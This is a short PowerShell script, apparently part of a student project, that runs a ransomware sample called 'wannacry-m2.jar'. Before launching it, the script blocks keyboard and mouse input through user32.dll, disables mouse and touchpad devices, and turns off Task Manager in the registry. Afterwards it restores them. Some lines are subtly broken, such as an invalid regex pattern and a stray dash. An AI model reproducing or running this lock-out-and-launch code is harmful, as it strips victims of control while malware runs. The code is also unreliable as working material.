$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@
$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
# function Disable-UserInput($seconds) {
# 	$d1 = Get-Date
# 	Add-Type -AssemblyName System.Windows.Forms
# 	$userInput::BlockInput($true)
# 	do {
# 		[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
# 		$d2 = Get-Date
# 		$diff = $d2-$d1
#     } while ( $diff.TotalSeconds -lt $seconds )
# 	$userInput::BlockInput($false)
# }
Add-Type -AssemblyName System.Windows.Forms
$userInput::BlockInput($true)
get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -Match "*touchpad*" -or $_.FriendlyName -Match "*mouse*" -} | Disable-PnpDevice -confirm:$false
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
C:\Users\leoti\Documents\m2\projet_minientreprise\scripts\m2_minientreprise_scripts\scripts\ressources\ransomware\wannacry-m2.jar
Start-Sleep -seconds 5
get-pnpdevice -PresentOnly | where-object {$_.FriendlyName -Match "*touchpad*" -or $_.FriendlyName -Match "*mouse*"} | Enable-PnpDevice -confirm:$false
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f
$userInput::BlockInput($false)
# Stop-Process -Id $PID


